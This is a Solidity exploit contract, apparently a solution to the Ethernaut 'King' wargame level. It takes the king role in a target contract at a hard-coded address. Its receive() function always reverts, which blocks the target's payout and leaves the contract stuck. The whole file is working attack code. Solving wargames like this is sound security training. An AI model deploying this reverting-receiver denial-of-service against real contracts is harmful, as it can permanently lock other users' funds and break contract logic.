// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; // Latest solidity version

import '../contracts/King.sol';

contract HackKing {
    King public king = King(payable(0x7BB4BB82c116b67836197793a60999D34A7A7AE8));

    // Create a malicious contract and seed it with some Ethers
    function BadKing() public payable {}

    // This should trigger King fallback(), making this contract the king
    function becomeKing(uint256 toPay) public {
        address(king).call{value: toPay, gas: 4000000}('');
    }

    function transferBack(address myAddress, uint256 toPay) public {
        address(myAddress).call{value: toPay, gas: 4000000}('');
    }

    // This function fails "king.transfer" trx from Ethernaut
    receive() external payable {
        revert('jaja you fail');
    }
}
